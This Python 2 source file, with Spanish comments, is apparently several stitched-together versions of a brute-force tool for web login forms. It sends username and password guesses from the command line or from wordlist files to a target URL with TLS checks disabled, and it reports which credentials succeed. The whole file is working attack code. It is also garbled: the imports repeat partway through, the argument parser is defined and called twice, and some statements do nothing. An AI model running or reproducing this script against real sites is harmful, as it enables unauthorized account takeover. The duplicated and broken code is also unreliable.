#!/usr/bin/python

import requests
import argparse
import sys
from lxml.html import fromstring
import os.path

arg = ''
url = ''
userField = ''
passField = ''
user = ''
pwd = ''
userFile = ''
pwdFile = ''
message = ''
	


	
def single(url, userField, passField, user, pwd, userFile, pwdFile, message):
	#Antes del ataque
	mbefore = message
	
	#Login
	req = requests.post(url)
	for key, value in (req.headers).iteritems():
		if key.startswith('content-length'):
			cb = value
		else: 
			continue
	
	
	payload = { userField : user, passField: pwd}
	r = requests.post(url, data= payload)
	for key,value in (r.headers).iteritems():
		if key.startswith('content-length'):
			ca = value
			op = int(ca) - int(cb)
		else:
			continue			
	
	
	mafter =  r.text
	
	if mbefore in mafter or op>=110 and op<=120:
		print 'Ataque no exitoso con:'  + " User: " + user + " Password: " + pwd
	else:
		print "Ataque exitoso con:" + "User: " + user  + " Password: " + pwd
	

def usersFile(url, userField, passField, user, pwd, userFile, pwdFile, message):
	users = []
	if os.path.exists(userFile): #archivo con usuarios
		fo = open(userFile, 'r')
		for element in fo:
			users.append(element)
		fo.close()
		
		for i in range(0,len(users)):
			#Antes del ataque
			mbefore = message
			
			
			req = requests.post(url)
			for key, value in (req.headers).iteritems():
				if key.startswith('content-length'):
					cb = value
					#print value
				else: 
					continue
	
		
			#Login
			payload = { userField : users[i], passField: pwd}
			r = requests.post(url, data= payload)
			for key, value in (r.headers).iteritems():
				if key.startswith('content-length'):
					ca = value
					op = int(ca) - int(cb)
					#print op
				else: 
					continue
	
			#Login exitoso
			mafter =  r.text
			if mbefore in mafter or op <= 0 or op>=110 and op<=120:
				print 'Ataque no exitoso con:'  + " User: " + users[i] + " Password: " + pwd
			else:
				print "Ataque exitoso con:" + " User: " + users[i]  + " Password: " + pwd

#!/usr/bin/python

#Agregar al encabezado Content Type
import requests
import argparse
import sys
from lxml.html import fromstring
import os.path
from termcolor import colored

arg = ''
url = ''
userField = ''
passField = ''
user = ''
pwd = ''
userFile = ''
pwdFile = ''
message = ''
	

	
def single(url, userField, passField, user, pwd, userFile, pwdFile, message):
	mbefore = message
	requests.packages.urllib3.disable_warnings()		
	
	payadm1 = {userField: '', passField: ''}
	reqadm1 = requests.post(url,payadm1, verify=False)
	print colored(len(reqadm1.content), 'blue')
	
	payadm2 = {userField: '1', passField: ''}
	reqadm2 = requests.post(url,payadm2,verify=False)
	print colored(len(reqadm2.content), 'white')
	
	payadm3 = {userField: '12', passField: ''}
	reqadm3 = requests.post(url,payadm3,verify=False)
	print colored(len(reqadm3.content), 'yellow')
	
	payload = { userField : user, passField: pwd}
	r = requests.post(url, payload, verify=False)
	print colored(len(r.content), 'cyan')
	
	
	
	if int(len(reqadm2.content)) - 1 == int(len(reqadm1.content)) and int(len(reqadm3.content)) -2 == int(len(reqadm1.content)): # Si en la respuesta devuelve el nombre de usuario
		if int(len(r.content)) - int(len(user)) == int(len(reqadm1.content)) and mbefore in r.content:
			print 'Ataque no exitoso con:'  + " User: " + colored(user, 'green') + " Password: " + colored(pwd, 'green')
		else:
			print "Ataque exitoso con:" + " User: " + colored(user,'green')  + " Password: " + colored(pwd,'green')
	
	elif int(len(reqadm1.content)) == int(len(reqadm2.content)) and int(len(reqadm1.content)) == int(len(reqadm3.content)): # Si el Content-Lenght es igual
		if int(len(r.content)) == int(len(reqadm1.content)) and mbefore in r.content:
			print 'Ataque no exitoso con:'  + " User: " + colored(user, 'green') + " Password: " + colored(pwd, 'green')
		else:
			print "Ataque exitoso con:" + " User: " + colored(user,'green')  + " Password: " + colored(pwd,'green')
	else: # Si no se puede determinar mediante content-lenght
		if mbefore in r.text:
			print 'Ataque no exitoso con:'  + " User: " + colored(user, 'green') + " Password: " + colored(pwd, 'green')
		else:
			print "Ataque exitoso con:" + " User: " + colored(user,'green')  + " Password: " + colored(pwd,'green')		
		
		
def usersFile(url, userField, passField, user, pwd, userFile, pwdFile, message):
	users = []
	requests.packages.urllib3.disable_warnings()		
	
	payadm1 = {userField: '', passField: ''}
	reqadm1 = requests.post(url,payadm1, verify=False)
	print colored(len(reqadm1.content), 'blue')
	
	payadm2 = {userField: '1', passField: ''}
	reqadm2 = requests.post(url,payadm2,verify=False)
	print colored(len(reqadm2.content), 'white')
	
	payadm3 = {userField: '12', passField: ''}
	reqadm3 = requests.post(url,payadm3,verify=False)
	print colored(len(reqadm3.content), 'yellow')

	if os.path.exists(userFile): #archivo con usuarios
		fo = open(userFile, 'r')
		for element in fo:
			users.append(element)
		fo.close()
		
		for i in range(0,len(users)):	
			mbefore = message
				
			#Login
			payload = { userField : users[i], passField: pwd}
			r = requests.post(url, data= payload, verify=False)
			print colored(len(r.content), 'cyan')
			
			if int(len(reqadm2.content)) - 1 == int(len(reqadm1.content)) and int(len(reqadm3.content)) -2 == int(len(reqadm1.content)): # Si en la respuesta devuelve el nombre de usuario
				if int(len(r.content)) - int(len(users[i])-1) == int(len(reqadm1.content)) and mbefore in r.content:
					print 'Ataque no exitoso con:'  + " User: " + colored(users[i], 'green').rstrip('\n'), " Password: " + colored(pwd, 'green')
				else:
					print "Ataque exitoso con:" + " User: " + colored(users[i],'green').rstrip('\n'), " Password: " + colored(pwd,'green')
	
			elif int(len(reqadm1.content)) == int(len(reqadm2.content)) and int(len(reqadm1.content)) == int(len(reqadm3.content)): # Si el Content-Lenght es igual
				if int(len(r.content)) == int(len(reqadm1.content)) and mbefore in r.content:
					print 'Ataque no exitoso con:'  + " User: " + colored(users[i], 'green') + " Password: " + colored(pwd, 'green')
				else:
					print "Ataque exitoso con:" + " User: " + colored(users[i],'green')  + " Password: " + colored(pwd,'green')
	
			else: # Si no se puede determinar mediante content-lenght
				if mbefore in r.text:
					print 'Ataque no exitoso con:'  + " User: " + colored(users[i], 'green') + " Password: " + colored(pwd, 'green')
				else:
					print "Ataque exitoso con:" + " User: " + colored(users[i],'green')  + " Password: " + colored(pwd,'green')		
	
def pwdFile(url, userField, passField, user, pwd, userFile, pwdFile, message):
	passwords = []
	
	requests.packages.urllib3.disable_warnings()		
	
	payadm1 = {userField: '', passField: ''}
	reqadm1 = requests.post(url,payadm1, verify=False)
	print colored(len(reqadm1.content), 'blue')
	
	payadm2 = {userField: '1', passField: ''}
	reqadm2 = requests.post(url,payadm2,verify=False)
	print colored(len(reqadm2.content), 'white')
	
	payadm3 = {userField: '12', passField: ''}
	reqadm3 = requests.post(url,payadm3,verify=False)
	print colored(len(reqadm3.content), 'yellow')
	
	if os.path.exists(pwdFile): #archivo con usuarios
		fo = open(pwdFile, 'r')
		for element in fo:
			passwords.append(element)
		fo.close()
		
		for i in range(0,len(passwords)):
			#Antes del ataque
			mbefore = message
		
			#Login
			payload = { userField : user, passField: passwords[i]}
			r = requests.post(url, data= payload, verify=False)
			print colored(len(r.content), 'cyan')
			
			if int(len(reqadm2.content)) - 1 == int(len(reqadm1.content)) and int(len(reqadm3.content)) -2 == int(len(reqadm1.content)): # Si en la respuesta devuelve el nombre de usuario
				if int(len(r.content)) - int(len(user)) == int(len(reqadm1.content)) and mbefore in r.content:
					print 'Ataque no exitoso con:'  + " User: " + colored(user, 'green'), " Password: " + colored(passwords[i], 'green')
				else:
					print "Ataque exitoso con:" + " User: " + colored(user,'green'), " Password: " + colored(passwords[i],'green')
	
			
	
			else: # Si no se puede determinar mediante content-lenght
				if mbefore in r.text:
					print 'Ataque no exitoso con:'  + " User: " + colored(user, 'green') + " Password: " + colored(passwords[i], 'green')
				else:
					print "Ataque exitoso con:" + " User: " + colored(user,'green')  + " Password: " + colored(passwords[i],'green')		

	
	
	
def getParams(arg):
	parser = argparse.ArgumentParser(description='Fuerza Bruta',
		formatter_class=argparse.ArgumentDefaultsHelpFormatter)

	parser.add_argument('-b', '--bruteforce', help = 'URL Site', required=True)
	parser.add_argument('-f','--field', help = 'User and Password Field separated by space', required=True, nargs=2)
	parser.add_argument('-u', '--user', help = 'User account')
	parser.add_argument('-p', '--password', help='User\'s password')
	parser.add_argument('-U', '--users', help='File with users')
	parser.add_argument('-P', '--passwords', help='File with passwords')
	parser.add_argument('-m', '--message', help='Error message', required=True)
	
	options = parser.parse_args()
	
	if len(sys.argv) == 1:
		print parser.print_help()
	elif options.password is None and options.users is None and options.user is not None and options.passwords is not None:
		pwdFile(options.bruteforce,options.field[0],options.field[1],options.user,'','',options.passwords,options.message)
	elif options.user is None and options.passwords is None and options.users is not None and options.password is not None:
		usersFile(options.bruteforce,options.field[0],options.field[1],'',options.password,options.users,'',options.message)
	elif options.users is None and options.passwords is None and options.user is not None and options.password is not None:
		single(options.bruteforce,options.field[0],options.field[1],options.user,options.password,'','',options.message)
	elif options.user is None and options.users is None or options.password is None and options.passwords is None:
		print parser.print_help()

		
getParams(arg)


def doubleFile(url, userField, passField, user, pwd, userFile, pwdFile, message):
	users = []
	passwords = []
	i = 0
	j = 0
	
	if os.path.exists(userFile) and os.path.exists(pwdFile): # ambos archivos
		
		fo = open(userFile, 'r')
		for element in fo:
			users.append(element)
		fo.close()
		
		fo = open(pwdFile, 'r')
		for element in fo:
			passwords.append(element)
		fo.close()
		
		for i in range(0,len(users)):
			for j in range (0,len(passwords)):
				#Antes del ataque
				mbefore = message
				
				req = requests.post(url)
				for key, value in (req.headers).iteritems():
					if key.startswith('content-length'):
						cb = value
						#print value
					else: 
						continue
				#Login
				payload = { userField : users[i], passField: passwords[j]}
				
				r = requests.post(url, data= payload)
				for key, value in (r.headers).iteritems():
					if key.startswith('content-length'):
						ca = value
						op = int(ca) - int(cb)
						#print op
					else: 
						continue
	
				#Login exitoso
				mafter =  r.text
				
				if mbefore in mafter or op <= 0 or op>=110 and op<=120:
					print 'Ataque no exitoso con:'  + " User: " + users[i] , " Password: " + passwords[j]
				else:
					print "Ataque exitoso con:" + " User: " + users[i]  , " Password: " + passwords[j]
					
				j + 1
			i + 1
		


def getParams(arg):
	parser = argparse.ArgumentParser(description='Fuerza Bruta',
		formatter_class=argparse.ArgumentDefaultsHelpFormatter)

	parser.add_argument('-b', '--bruteforce', help = 'URL Site', required=True)
	parser.add_argument('-f','--userField', help = 'User Field to attack', required=True)
	parser.add_argument('-F', '--passField', help = 'Password Field to attack', required=True)
	parser.add_argument('-u', '--user', help = 'User account')
	parser.add_argument('-p', '--password', help='User\'s password')
	parser.add_argument('-U', '--users', help='File with users')
	parser.add_argument('-P', '--passwords', help='File with passwords')
	parser.add_argument('-m', '--message', help='Error message', required=True)
	
	
					
	options = parser.parse_args()
	
	
	if len(sys.argv) == 1:
		print parser.print_help()
	
	if options.user is None and options.password is None and options.users is not None and options.passwords is not None:
		doubleFile(options.bruteforce,options.userField,options.passField,'','',options.users,options.passwords,options.message)
	elif options.password is None and options.users is None and options.user is not None and options.passwords is not None:
		pwdFile(options.bruteforce,options.userField,options.passField,options.user,'','',options.passwords,options.message)
	elif options.user is None and options.passwords is None and options.users is not None and options.password is not None:
		usersFile(options.bruteforce,options.userField,options.passField,'',options.password,options.users,'',options.message)
	elif options.users is None and options.passwords is None and options.user is not None and options.password is not None:
		single(options.bruteforce,options.userField,options.passField,options.user,options.password,'','',options.message)
	elif options.user is None and options.users is None or options.password is None and options.passwords is None:
		print parser.print_help()
		

		
getParams(arg)
